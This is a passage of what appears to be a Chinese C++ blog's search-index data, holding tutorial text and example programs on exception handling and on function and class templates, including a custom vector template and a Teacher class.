代码块起，到异常被抛掷前，这期间在栈上构造的所有对象，都会被自动析构，析构的顺序与构造的顺序相反。这一过程称为 栈解旋（unwinding）。 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;iostream&gt;using namespace std;class Test {public: Test(int a, int b) { this-&gt;a = a; this-&gt;b = b; cout &lt;&lt; "构造函数被调用" &lt;&lt; endl; } ~Test() { cout &lt;&lt; "析构函数被调用" &lt;&lt; endl; }private: int a; int b;};int divide(int x, int y) { Test t1(3, 4), t2(5, 6); if (0 == y) { throw y; // 抛出 int 类型的异常 } return x / y;}int main() { // divide(5, 0); 如果 divide() 函数的调用写在 try 代码块之外，那么 Test 类的析构函数不会自动被调用 try { int result = divide(5, 0); cout &lt;&lt; "result = " &lt;&lt; result &lt;&lt; endl; } catch (int e) { cout &lt;&lt; e &lt;&lt; ", 被除数不能为零" &lt;&lt; endl; } catch (...) { cout &lt;&lt; "发生未知的异常"; } return 0;} 程序运行输出的结果如下： 12345构造函数被调用构造函数被调用析构函数被调用析构函数被调用0, 被除数不能为零 异常接口的声明 a) 为了加强程序的可读性，可以在函数声明中列出可能抛出的所有异常类型，例如：void func() throw (A, B, C , D) {}，这个函数 func（） 能够且只能抛出类型 A、B、C、D 及其子类型的异常 b) 如果一个函数抛出了它的异常接口声明所不允许抛出的异常，unexpected() 函数会被调用，该函数的默认行为是调用 terminate() 函数中止程序 c) 如果在函数声明中没有包含异常接口声明，则此函数可以抛掷任何类型的异常，例如：void func() {} d) 一个不抛掷任何类型异常的函数，可以声明为：void func() throw() {} 12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;using namespace std;class A {};class B {};class C {};class D {};class F {};// 能够且只能抛出类型 A、B、C、D 及其子类型的异常void funcA() throw (A, B, C, D) { throw A();}// 不能抛出任何类型的异常void funcB() throw() {}// 可以抛出任何类型的异常void funcC() { throw B();}int main() { try { funcA(); } catch (...) { cout &lt;&lt; "发生异常 ..." &lt;&lt; endl; } return 0;} 程序运行输出的结果如下： 1发生异常 ... 默认的异常处理器terminate () 函数在 C++ 中，异常是不可以忽略的，当异常找不到匹配的 catch 子句时，会调用系统的库函数 terminate()（在头文件中）；默认情况下，terminate（） 函数会调用标准 C 库函数 abort（） 使程序终止而退出。当调用 abort() 函数时，程序不会调用正常的终止函数，也就是说，全局对象和静态对象的析构函数不会执行，这就可能会导致内存泄漏。值得一提的是，在多线程程序中，各个 terminate() 函数是互相独立的，每个线程都有自己的 terminate() 函数。 set_terminate () 函数在 C++ 中，通过使用标准的 set_terminate() 函数，可以设置自己的 terminate（) 函数。自定义的 terminate() 函数不能有参数，而且返回值类型必须为 void。另外，terminate() 函数不能抛出异常，它必须终止程序。如果 terminate() 函数被调用，这就意味着问题已经无法解决了。 设置默认的异常处理器1234567891011121314151617181920212223242526272829303132333435#include &lt;iostream&gt;using namespace std;// 自定义 terminate() 函数void myTerminate() { cout &lt;&lt; "函数 myTerminate() 被 terminate() 调用!" &lt;&lt; endl; exit(-1);}int divide(int x, int y) { return x / y;}int main() { // 设置默认的异常处理器 set_terminate(myTerminate); int x = 10, y = 0, result; try { if (y == 0) { throw "被除数为零!"; //抛出异常，由 terminate() 函数捕获 } else { result = x / y; } } // 不会被整型异常捕获 catch (int e) { cout &lt;&lt; "捕获到整型异常!" &lt;&lt; endl; } cout &lt;&lt; "程序正常结束运行!" &lt;&lt; endl; return 0;} 程序运行输出的结果如下： 1函数 myTerminate() 被 terminate() 调用! C++ 提供的标准异常库标准异常库的介绍 标准异常库的使用案例123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;iostream&gt;using namespace std;class Teacher {public: Teacher(int age) { if (age &gt; 100) { // 抛出标准库内的异常 throw out_of_range("年龄太大"); } this-&gt;age = age; }private: int age;};// 继承标准库内的异常class MyException : public exception {public: MyException(const char *p) { this-&gt;m_p = p; } virtual const char *what() { cout &lt;&lt; "MyException 类型的异常 : " &lt;&lt; m_p &lt;&lt; endl; return m_p; }private: const char *m_p;};int main() { try { // Teacher teacher(105); throw MyException("发生自定义异常!"); } catch (out_of_range e) { cout &lt;&lt; "out_of_range 类型的异常 : " &lt;&lt; e.what() &lt;&lt; endl; } catch (MyException &amp;e) { e.what(); } catch (...) { cout &lt;&lt; "发生未知类型的异常!" &lt;&lt; endl; } return 0;} 程序运行输出的结果如下： 1MyException 类型的异常 : 发生自定义异常! 异常类型和异常变量的生命周期 throw 异常是有类型的，可以使用数字、字符串、类对象，catch 严格按照类型进行匹配 throw 类对象类型的异常时： 如果捕获异常的时候，使用一个异常变量，则拷贝构造该异常变量 如果捕获异常的时候，使用了引用，则会使用 throw 时候的那个对象 捕获异常的时候，指针可以和引用 / 元素同时出现，但是引用与元素不能同时出现 结论：如果抛出的是类对象类型的异常，则使用引用进行异常捕获比较合适 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596#include &lt;iostream&gt;using namespace std;class BadSrcType {};class BadDestType {};class BadProcessType {public: BadProcessType() { cout &lt;&lt; "BadProcessType的构造函数被调用" &lt;&lt; endl; } BadProcessType(const BadProcessType&amp; obj) { cout &lt;&lt; "BadProcessType的拷贝构造函数被调用" &lt;&lt; endl; } ~BadProcessType() { cout &lt;&lt; "BadProcessType的析构函数被调用" &lt;&lt; endl; }};void myStrcpy(char* to, char* from) { if (to == NULL) { throw BadDestType(); } if (from == NULL) { throw BadSrcType(); } if (*from == \'a\') { throw BadProcessType(); } if (*from == \'b\') { // 不建议使用这种写法 throw&amp; (BadProcessType()); } if (*from == \'c\') { throw new BadProcessType; } while (*from != \'\\0\') { *to = *from; to++; from++; } *to = \'\\0\';}int main() { int ret = 0; char buf1[] = "cbbcdefg"; char buf2[1024] = { 0 }; try { myStrcpy(buf2, buf1); } catch (BadSrcType e) { cout &lt;&lt; " BadSrcType 类型异常" &lt;&lt; endl; } catch (BadDestType e) { cout &lt;&lt; " BadDestType 类型异常" &lt;&lt; endl; } /* // 结论1: 如果接收异常的时候，使用一个异常变量，则拷贝构造该异常变量 catch (BadProcessType e) { cout &lt;&lt; " BadProcessType 类型异常" &lt;&lt; endl; } // 结论2: 如果接收异常的时候，使用了引用，则会使用throw时候的那个对象 catch (BadProcessType&amp; e) { cout &lt;&lt; " BadProcessType 类型异常" &lt;&lt; endl; } // 结论3: 接收异常的时候，指针可以和引用/元素同时出现，但是引用与元素不能同时出现 catch (BadProcessType* e) { cout &lt;&lt; " BadProcessType 类型异常" &lt;&lt; endl; delete e; } // 结论4: 如果抛出的是类对象类型的异常，则使用引用进行异常捕获比较合适 */ catch (...) { cout &lt;&lt; "未知 类型异常" &lt;&lt; endl; } return 0;} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++"},{title:"C++ 进阶基础之二",url:"/posts/779107de.html",text:'大纲 C++ 进阶基础之一、C++ 进阶基础之二、C++ 进阶基础之三 C++ 进阶基础之四、C++ 进阶基础之五、C++ 进阶基础之六 C++ 进阶基础之七、C++ 进阶基础之八 函数模板和类模板C++ 提供了函数模板（function template）。所谓函数模板，实际上是建立一个通用函数，其函数类型和形参类型不具体指定，用一个虚拟的类型来代表，这个通用函数就称为函数模板。凡是函数体相同的函数都可以用这个模板来代替，不必定义多个函数，只需在模板中定义一次即可。在调用函数时，系统会根据实参的类型来取代模板中的虚拟类型，从而实现不同函数的功能。 C++ 提供两种模板机制：函数模板、类模板 模板又称之为 泛型编程 模板把函数或类要处理的数据类型参数化，表现为参数的多态性，称为类属 模板用于表达逻辑结构相同，但具有数据元素类型不同的数据对象的通用行为 类属 —— 类型参数化，又称参数模板，使得程序（算法）可以从逻辑功能上抽象，把被处理的对象（数据）类型作为参数传递 函数模板函数模板的定义 模板声明的语法为：template &lt; 类型形式参数表 &gt;，例如 template &lt;typename T&gt; 类型形式参数表的语法为：typename T1 , typename T2 , …… , typename Tn 或者 class T1 , class T2 , …… , class Tn 函数模板的调用 myswap(a, b);：自动数据类型推导 myswap&lt;float&gt;(a, b);：显示类型调用（推荐） 函数模板的简单使用 12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;using namespace std;// 模板声明template &lt;typename T&gt;// 函数定义void myswap(T &amp;a, T &amp;b) { T temp; temp = a; a = b; b = temp;}int main() { // 自动数据类型推导 int x = 1, y = 2; myswap(x, y); printf("x = %d, y = %d\\n", x, y); // 自动数据类型推导 double n = 0.5, m = 0.8; myswap(n, m); printf("n = %f, m = %f\\n", n, m); // 显示类型调用（推荐） char i = \'h\', j = \'e\'; myswap&lt;char&gt;(i, j); printf("n = %c, m = %c\\n", i, j); return 0;} 程序运行输出的结果如下： 123x = 2, y = 1n = 0.800000, m = 0.500000n = e, m = h 函数模板做函数参数123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#include &lt;iostream&gt;using namespace std;// 使用函数模板，实现数组排序template &lt;typename T1&gt;void arraySort(T1* array, int size, bool asc = true) { if (array == NULL || size == 0) { return; } T1 tmp; for (int i = 0; i &lt; size; i++) { for (int j = i + 1; j &lt; size; j++) { // 升序排序（从小到大） if (asc) { if (array[i] &gt; array[j]) { tmp = array[i]; array[i] = array[j]; array[j] = tmp; } } // 降序排序（从大到小） else { if (array[i] &lt; array[j]) { tmp = array[i]; array[i] = array[j]; array[j] = tmp; } } } }}// 使用函数模板，打印数组template &lt;typename T2&gt;void printArray(T2* array, int size) { for (int i = 0; i &lt; size; i++) { cout &lt;&lt; array[i] &lt;&lt; " "; } cout &lt;&lt; endl;}int main() { int array[] = { 32, 16, 29, 9, 43, 53, 23 }; int size = sizeof(array) / sizeof(*array); cout &lt;&lt; "排序之前: "; printArray&lt;int&gt;(array, size); arraySort&lt;int&gt;(array, size, false); cout &lt;&lt; "排序之后: "; printArray&lt;int&gt;(array, size); cout &lt;&lt; "------------------------------" &lt;&lt; endl; char array2[] = { \'c\', \'z\', \'h\', \'i\', \'q\', \'m\' }; int size2 = sizeof(array2) / sizeof(*array2); cout &lt;&lt; "排序之前: "; printArray&lt;char&gt;(array2, size2); arraySort&lt;char&gt;(array2, size2); cout &lt;&lt; "排序之后: "; printArray&lt;char&gt;(array2, size2); return 0;} 程序运行输出的结果如下： 12345排序之前: 32 16 29 9 43 53 23排序之后: 53 43 32 29 23 16 9------------------------------排序之前: c z h i q m排序之后: c h i m q z 函数模板与普通函数函数模板和普通函数的区别： a) 函数模板不允许自动类型转化 b) 普通函数能够进行自动类型转换 函数模板和普通函数的调用规则： a) C++ 编译器优先考虑使用普通函数 b) 如果函数模板可以产生一个更好的匹配，那么编译器会选择函数模板 123456789101112131415161718192021222324252627#include &lt;iostream&gt;using namespace std;template &lt;typename T&gt;void myswap(T&amp; a, T&amp; b) { T tmp; tmp = a; a = b; b = tmp; cout &lt;&lt; "模板函数被调用" &lt;&lt; endl;}void myswap(int a, char b) { cout &lt;&lt; "a = " &lt;&lt; a &lt;&lt; ", b = " &lt;&lt; b &lt;&lt; endl; cout &lt;&lt; "普通函数被调用" &lt;&lt; endl;}int main() { int a = 10; char c = \'z\'; myswap(a, c); // 调用普通函数 myswap(c, a); // 调用普通函数，会进行隐式的类型转换 myswap(a, a); // 调用函数模板（本质是类型参数化），将严格地按照类型进行匹配，不会进行隐式的类型转换 return 0;} 程序运行输出的结果如下： 123456a = 10, b = z普通函数被调用a = 122, b =普通函数被调用模板函数被调用 函数模板与函数重载 a) 函数模板可以像普通函数一样被重载 b) 通过空模板实参列表的语法，可以限制编译器只使用函数模板匹配 c) 如果函数模板可以产生一个更好的匹配，那么编译器会选择函数模板 123456789101112131415161718192021222324252627282930313233343536#include "iostream"using namespace std;int Max(int a, int b){ cout &lt;&lt; "int Max(int a, int b)" &lt;&lt; endl; return a &gt; b ? a : b;}template &lt;typename T&gt;T Max(T a, T b){ cout &lt;&lt; "T Max(T a, T b)" &lt;&lt; endl; return a &gt; b ? a : b;}// 函数模板重载template &lt;typename T&gt;T Max(T a, T b, T c){ cout &lt;&lt; "T Max(T a, T b, T c)" &lt;&lt; endl; return Max(Max(a, b), c);}void main(){ int a = 1; int b = 2; cout &lt;&lt; Max(a, b) &lt;&lt; endl; // 当函数模板和普通函数都符合调用时,优先选择普通函数 cout &lt;&lt; Max&lt;&gt;(a, b) &lt;&lt; endl; // 通过空模板实参列表的语法，可以限制编译器只使用函数模板匹配 cout &lt;&lt; Max(3.0, 4.0) &lt;&lt; endl; // 如果函数模板产生更好的匹配 使用函数模板 cout &lt;&lt; Max(5.0, 6.0, 7.0) &lt;&lt; endl; // 函数模板的重载 cout &lt;&lt; Max(\'a\', 100) &lt;&lt; endl; // 调用普通函数，可以进行隐式类型转换 return;} 程序运行输出的结果如下： 123456789101112int Max(int a, int b)2T Max(T a, T b)2T Max(T a, T b)4T Max(T a, T b, T c)T Max(T a, T b)T Max(T a, T b)7int Max(int a, int b)100 函数模板底层原理剖析 编译器并不是根据函数模板，产生能够处理任意参数的函数 编译器本质上是根据具体的调用类型，从函数模板产生不同的函数 编译器会对函数模板进行两次编译，在声明的地方对函数模板代码本身进行第一次编译，在调用的地方对参数替换后的函数模板代码进行第二次编译 类模板类模板与函数模板的定义和使用类似，在实际项目开发中，经常有两个或多个类，其功能是相同的，仅仅是数据类型不同，为了不重复定义功能相同的类，可以使用类模板来解决这类问题。 类模板的定义 类模板用于实现类所需数据的类型参数化 类模板在表示如数组、表、图等数据结构显得特别重要，这些数据结构的表示和算法不受所包含的元素类型的影响 在下述的所有代码中，template &lt;typename T&gt; 等价于 template &lt;class T&gt; 类模板的简单使用值得一提的是，在类模板中如果使用了构造函数，则必须遵守 C++ 类的构造函数的调用规则 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;iostream&gt;using namespace std;// 模板声明template &lt;typename T&gt;// 类定义class A {public: A(T t) { this-&gt;t = t; } T&amp; getT() { return this-&gt;t; }private: T t;};// 类模板做函数参数void printA(A&lt;int&gt;&amp; a) { cout &lt;&lt; a.getT() &lt;&lt; endl;}int main() { A&lt;int&gt; a(100); // 模板类是抽象的，需要声明具体的类型（模板参数列表），这里的 &lt;int&gt; 不能省略 cout &lt;&lt; a.getT() &lt;&lt; endl; A&lt;int&gt; a2(50); printA(a2); return 0;} 程序运行输出的结果如下： 1210050 类模板与派生类的使用普通类继承类模板在 C++ 中，类模板可以被普通类继承，普通类继承类模板时，需要声明父类具体的数据类型。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;iostream&gt;using namespace std;// 模板声明template &lt;typename T&gt;// 类定义class A {public: A(T a) { this-&gt;a = a; } T&amp; getA() { return this-&gt;a; }public: T a;};// 普通类继承类模板，需要声明具体的类型（模板参数列表），这里的 &lt;int&gt; 不能省略class B : public A&lt;int&gt; {public: B(int a, int b) : A&lt;int&gt;(a) { this-&gt;b = b; } void printB() { cout &lt;&lt; "a = " &lt;&lt; a &lt;&lt; ", b = " &lt;&lt; b &lt;&lt; endl; }public: int b;};int main() { A&lt;int&gt; a(100); cout &lt;&lt; a.getA() &lt;&lt; endl; B b(1, 3); b.printB(); return 0;} 程序运行输出的结果如下： 12100a = 1, b = 3 类模板继承类模板12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;iostream&gt;using namespace std;// 模板声明template &lt;typename T&gt;// 类定义class A {public: A(T a) { this-&gt;a = a; } T&amp; getA() { return this-&gt;a; }public: T a;};// 模板声明template &lt;typename T&gt;// 类模板继承类模板class B : public A&lt;T&gt; {public: B(T a, T b) : A(a) { this-&gt;b = b; } T&amp; getB() { return this-&gt;b; }private: T b;};int main() { A&lt;int&gt; a(3); cout &lt;&lt; a.getA() &lt;&lt; endl; B&lt;double&gt; b(3.2, 4.5); cout &lt;&lt; b.getA() &lt;&lt; endl; cout &lt;&lt; b.getB() &lt;&lt; endl; return 0;} 程序运行输出的结果如下： 12333.24.5 类模板函数的三种写法值得一提的是，企业项目开发中，建议使用第一种或者第三种方式，STL 库一般都采用第一种方式。 所有的类模板函数写在类的内部（第一种）12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &lt;iostream&gt;using namespace std;template &lt;typename T&gt;class Complex {public: // 构造函数 Complex(T a, T b) { this-&gt;a = a; this-&gt;b = b; } // 类成员函数 void print() { cout &lt;&lt; "a = " &lt;&lt; this-&gt;a &lt;&lt; ", b = " &lt;&lt; this-&gt;b &lt;&lt; endl; } // 类成员函数，重载运算符 "+" Complex operator+(Complex&amp; c2) { Complex tmp(this-&gt;a + c2.a, this-&gt;b + c2.b); return tmp; } // 友元函数，重载运算符 "&lt;&lt;" friend ostream&amp; operator&lt;&lt;(ostream&amp; out, Complex&amp; c1) { cout &lt;&lt; "a = " &lt;&lt; c1.a &lt;&lt; ", b = " &lt;&lt; c1.b; return out; } // 友元函数 friend Complex sub(Complex&amp; c1, Complex&amp; c2) { Complex tmp(c1.a - c2.a, c1.b - c2.b); return tmp; }private: T a; T b;};int main() { Complex&lt;int&gt; c1(1, 4); Complex&lt;int&gt; c2(3, 6); c1.print(); c2.print(); Complex&lt;int&gt; c3 = c1 + c2; cout &lt;&lt; c3 &lt;&lt; endl; Complex&lt;int&gt; c4 = sub(c1, c2); cout &lt;&lt; c4 &lt;&lt; endl; return 0;} 程序运行输出的结果如下： 1234a = 1, b = 4a = 3, b = 6a = 4, b = 10a = -2, b = -2 所有的类模板函数写在类的外部（第二种）所有的类模板函数写在类的外部（写在同一个 .cpp 文件），当使用友元函数重载了 &lt;&lt;、&gt;&gt; 运算符时，需要特别注意声明友元函数的写法 friend ostream&amp; operator&lt;&lt; &lt;T&gt;(ostream&amp; out, Complex&amp; c1);。特别注意，除了重载运算符 &lt;&lt;、&gt;&gt; 必须使用友元函数之外，其他运算符的重载尽量都使用类成员函数。千万不要滥用友元函数，尤其类模板与友元函数一起使用的时候，这是因为需要使用怪异的语法来解决 C++ 编译器出现的错误，且不同的 C++ 编译器表现行为不一定一致。假设在类模板中滥用了友元函数，解决 C++ 编译问题的语法详见 图解分析。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#include &lt;iostream&gt;using namespace std;/********** START 解决类模板与友元函数滥用（非重载左移与右移运算符）时出现的编译问题 *********/template &lt;typename T&gt; class Complex;template &lt;typename T&gt; Complex&lt;T&gt; sub(Complex&lt;T&gt;&amp; c1, Complex&lt;T&gt;&amp; c2);/********** END 解决类模板与友元函数滥用（非重载左移与右移运算符）时出现的编译问题 *********/template &lt;typename T&gt;class Complex {public: // 构造函数 Complex(T a, T b); // 类成员函数 void print(); // 类成员函数，重载运算符 "+" Complex operator+(Complex&amp; c2); // 友元函数（滥用友元函数） friend Complex sub&lt;T&gt;(Complex&amp; c1, Complex&amp; c2); // 友元函数，重载运算符 "&lt;&lt;" friend ostream&amp; operator&lt;&lt; &lt;T&gt;(ostream&amp; out, Complex&amp; c1);private: T a; T b;};// 构造函数template &lt;typename T&gt;Complex&lt;T&gt;::Complex(T a, T b) { this-&gt;a = a; this-&gt;b = b;}// 类成员函数template &lt;typename T&gt;void Complex&lt;T&gt;::print() { cout &lt;&lt; "a = " &lt;&lt; this-&gt;a &lt;&lt; ", b = " &lt;&lt; this-&gt;b &lt;&lt; endl;}// 类成员函数，重载运算符 "+"template &lt;typename T&gt;Complex&lt;T&gt; Complex&lt;T&gt;::operator+(Complex&lt;T&gt;&amp; c2) { Complex&lt;T&gt; tmp(this-&gt;a + c2.a, this-&gt;b + c2.b); return tmp;}// 友元函数，重载运算符 "&lt;&lt;"template &lt;typename T&gt;ostream&amp; operator&lt;&lt;(ostream&amp; out, Complex&lt;T&gt;&amp; c1) { cout &lt;&lt; "a = " &lt;&lt; c1.a &lt;&lt; ", b = " &lt;&lt; c1.b; return out;}// 友元函数（滥用友元函数）template &lt;typename T&gt;Complex&lt;T&gt; sub(Complex&lt;T&gt;&amp; c1, Complex&lt;T&gt;&amp; c2) { Complex&lt;T&gt; tmp(c1.a - c2.a, c1.b - c2.b); return tmp;}int main() { Complex&lt;int&gt; c1(3, 8); Complex&lt;int&gt; c2(9, 5); c1.print(); c2.print(); Complex&lt;int&gt; c3 = c1 + c2; cout &lt;&lt; c3 &lt;&lt; endl; Complex&lt;int&gt; c4 = sub(c1, c2); cout &lt;&lt; c4 &lt;&lt; endl; return 0;} 程序运行输出的结果如下： 1234a = 3, b = 8a = 9, b = 5a = 12, b = 13a = -6, b = 3 所有的类模板函数写在类的外部（第三种）所有的类模板函数写在类的外部（分开写在 .h 和 .cpp 中），这里除了重载运算符 &lt;&lt;、&gt;&gt; 必须使用友元函数之外，千万不要滥用友元函数；因为 C++ 编译器会出现编译错误，且没有很好的解决方法。 complex.h 123456789101112131415161718192021#pragma once#include &lt;iostream&gt;using namespace std;template &lt;typename T&gt;class Complex {public: Complex(T a, T b); void print(); Complex operator+(Complex&amp; c2); friend ostream&amp; operator&lt;&lt; &lt;T&gt;(ostream&amp; out, Complex&amp; c1);private: T a; T b;}; complex.hpp，这里的 .hpp 文件与 .cpp 文件本质上没有区别，为了方便区分意图，只是文件的后缀不一样而已 12345678910111213141516171819202122232425262728#include "complex.h"// 构造函数template &lt;typename T&gt;Complex&lt;T&gt;::Complex(T a, T b) { this-&gt;a = a; this-&gt;b = b;}// 类成员函数template &lt;typename T&gt;void Complex&lt;T&gt;::print() { cout &lt;&lt; "a = " &lt;&lt; this-&gt;a &lt;&lt; ", b = " &lt;&lt; this-&gt;b &lt;&lt; endl;}// 类成员函数，重载运算符 "+"template &lt;typename T&gt;Complex&lt;T&gt; Complex&lt;T&gt;::operator+(Complex&lt;T&gt;&amp; c2) { Complex&lt;T&gt; tmp(this-&gt;a + c2.a, this-&gt;b + c2.b); return tmp;}// 友元函数，重载运算符 "&lt;&lt;"template &lt;typename T&gt;ostream&amp; operator&lt;&lt;(ostream&amp; out, Complex&lt;T&gt;&amp; c1) { cout &lt;&lt; "a = " &lt;&lt; c1.a &lt;&lt; ", b = " &lt;&lt; c1.b; return out;} main.cpp，特别注意，这里引入的是 .hpp 或者 .cpp 文件，而不是 .h 头文件，否则 C++ 编译器会编译失败 12345678910111213#include "complex.hpp"int main() { Complex&lt;int&gt; c1(6, 13); Complex&lt;int&gt; c2(23, 34); c1.print(); c2.print(); Complex&lt;int&gt; c3 = c1 + c2; cout &lt;&lt; c3 &lt;&lt; endl; return 0;} 程序运行输出的结果如下： 123a = 6, b = 13a = 23, b = 34a = 29, b = 47 类模板中的 static 关键字 从类模板实例化的每种数据类型模板类都有自己的类模板数据成员，该数据类型的模板类的所有对象共享同一个 static 数据成员 和非模板类的 static 数据成员一样，模板类的 static 数据成员也应该在源文件范围内定义和初始化 每种数据类型的模板类都有自己单独一份的类模板的 static 数据成员副本，详见 图解分析 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#include &lt;iostream&gt;using namespace std;const double pi = 3.14;template &lt;typename T&gt; class Circle {public: Circle(T radius = 0) { this-&gt;m_radius = radius; this-&gt;m_total++; } void setRadius(T radius) { this-&gt;m_radius = radius; } T getRadius() { return this-&gt;m_radius; } double getGirth() { return 2 * pi * this-&gt;m_radius; } double getArea() { return pi * this-&gt;m_radius * this-&gt;m_radius; } // 类模板的静态成员函数 static int getTotal() { return m_total; }private: T m_radius; // 类模板的静态数据成员 static int m_total;};// 初始化类模板的静态数据成员template &lt;typename T&gt; int Circle&lt;T&gt;::m_total = 0;int main() { // 每种数据类型的模板类都有自己单独一份的类模板的 static 数据成员副本 Circle&lt;int&gt; c1(4), c2(6); cout &lt;&lt; "m_total = " &lt;&lt; Circle&lt;int&gt;::getTotal() &lt;&lt; endl; cout &lt;&lt; "radius = " &lt;&lt; c1.getRadius() &lt;&lt; ", girth = " &lt;&lt; c1.getGirth() &lt;&lt; ", area = " &lt;&lt; c1.getArea() &lt;&lt; endl; cout &lt;&lt; "radius = " &lt;&lt; c2.getRadius() &lt;&lt; ", girth = " &lt;&lt; c2.getGirth() &lt;&lt; ", area = " &lt;&lt; c2.getArea() &lt;&lt; endl; Circle&lt;float&gt; c3(3.2), c4(4.3), c5(6.2); cout &lt;&lt; "m_total = " &lt;&lt; Circle&lt;float&gt;::getTotal() &lt;&lt; endl; cout &lt;&lt; "radius = " &lt;&lt; c3.getRadius() &lt;&lt; ", girth = " &lt;&lt; c3.getGirth() &lt;&lt; ", area = " &lt;&lt; c3.getArea() &lt;&lt; endl; cout &lt;&lt; "radius = " &lt;&lt; c4.getRadius() &lt;&lt; ", girth = " &lt;&lt; c4.getGirth() &lt;&lt; ", area = " &lt;&lt; c4.getArea() &lt;&lt; endl; cout &lt;&lt; "radius = " &lt;&lt; c5.getRadius() &lt;&lt; ", girth = " &lt;&lt; c5.getGirth() &lt;&lt; ", area = " &lt;&lt; c5.getArea() &lt;&lt; endl; return 0;} 程序运行输出的结果如下： 1234567m_total = 2radius = 4, girth = 25.12, area = 50.24radius = 6, girth = 37.68, area = 113.04m_total = 3radius = 3.2, girth = 20.096, area = 32.1536radius = 4.3, girth = 27.004, area = 58.0586radius = 6.2, girth = 38.936, area = 120.702 数组模板类的实战案例下面将编写数组模板类，模拟 STL 容器的实现，同时贯穿上面所讲的 C++ 模板知识点。 ★点击显示完整的案例代码★ MyVector.h 123456789101112131415161718192021222324252627#pragma once#include &lt;iostream&gt;using namespace std;template &lt;class T&gt;class MyVector {public: MyVector(int size = 0); ~MyVector(); MyVector(const MyVector&amp; obj);public: int getSize();public: T&amp; operator[](int index); MyVector&amp; operator=(const MyVector&amp; obj); friend ostream&amp; operator&lt;&lt; &lt;T&gt;(ostream&amp; out, MyVector&amp; obj);private: T* m_space; // 指向数组的指针 int m_size;}; MyVector.hpp 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include "MyVector.h"// 构造函数template &lt;typename T&gt;MyVector&lt;T&gt;::MyVector(int size) { this-&gt;m_size = size; // 分配内存空间 this-&gt;m_space = new T[size];}// 析构函数template &lt;typename T&gt;MyVector&lt;T&gt;::~MyVector() { if (this-&gt;m_space) { // 释放内存空间 delete[] this-&gt;m_space; this-&gt;m_size = 0; this-&gt;m_space = NULL; }}// 拷贝构造函数template &lt;typename T&gt;MyVector&lt;T&gt;::MyVector(const MyVector&lt;T&gt;&amp; obj) { // 深拷贝 this-&gt;m_size = obj.m_size; this-&gt;m_space = new T[obj.m_size]; for (int i = 0; i &lt; obj.m_size; i++) { this-&gt;m_space[i] = obj.m_space[i]; }}// 普通类成员函数template &lt;typename T&gt;int MyVector&lt;T&gt;::getSize() { return this-&gt;m_size;}// 使用类成员函数，重载运算符 "[]"template &lt;typename T&gt;T&amp; MyVector&lt;T&gt;::operator[](int index) { return this-&gt;m_space[index];}// 使用类成员函数，重载运算符 "="template &lt;typename T&gt;MyVector&lt;T&gt;&amp; MyVector&lt;T&gt;::operator=(const MyVector&lt;T&gt;&amp; obj) { if (this-&gt;m_space) { // 释放原本的内存空间 delete[] this-&gt;m_space; this-&gt;m_size = 0; this-&gt;m_space = NULL; } // 深拷贝 this-&gt;m_size = obj.m_size; this-&gt;m_space = new T[obj.m_size]; for (int i = 0; i &lt; obj.m_size; i++) { this-&gt;m_space[i] = obj.m_space[i]; } return *this;};// 使用友元函数，重载运算符 "&lt;&lt;"template &lt;typename T&gt;ostream&amp; operator&lt;&lt;(ostream&amp; out, MyVector&lt;T&gt;&amp; obj) { for (int i = 0; i &lt; obj.m_size; i++) { cout &lt;&lt; obj.m_space[i] &lt;&lt; ", "; } return out;} Teacher.h 12345678910111213141516171819202122232425262728#pragma once#include &lt;iostream&gt;using namespace std;class Teacher {public: Teacher(); Teacher(int age, const char* name); Teacher(const Teacher&amp; obj); ~Teacher();public: Teacher&amp; operator=(const Teacher&amp; obj); friend ostream&amp; operator&lt;&lt;(ostream&amp; out, Teacher&amp; obj);public: int getAge(); char* getName(); void setAge(int age); void setName(const char* name);private: int m_age; char* m_name;}; Teacher.cpp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#include "Teacher.h"// 构造函数Teacher::Teacher() { this-&gt;m_age = 0; this-&gt;m_name = (char*)malloc(1); if (this-&gt;m_name) { strcpy(this-&gt;m_name, ""); }}// 构造函数Teacher::Teacher(int age, const char* name) { this-&gt;m_age = age; this-&gt;m_name = (char*)malloc(strlen(name) + 1); if (this-&gt;m_name) { strcpy(this-&gt;m_name, name); }}// 拷贝构造函数Teacher::Teacher(const Teacher&amp; obj) { // 深拷贝 this-&gt;m_age = obj.m_age; this-&gt;m_name = (char*)malloc(strlen(obj.m_name) + 1); if (this-&gt;m_name) { strcpy(this-&gt;m_name, obj.m_name); }}// 析构函数Teacher::~Teacher() { if (this-&gt;m_name) { free(this-&gt;m_name); }}// 使用类成员函数，重载运算符 "="Teacher&amp; Teacher::operator=(const Teacher&amp; obj) { // 释放原本的内存空间 if (this-&gt;m_name) { free(this-&gt;m_name); this-&gt;m_name = NULL; } // 深拷贝 this-&gt;m_age = obj.m_age; this-&gt;m_name = (char*)malloc(strlen(obj.m_name) + 1); if (this-&gt;m_name) { strcpy(this-&gt;m_name, obj.m_name); } 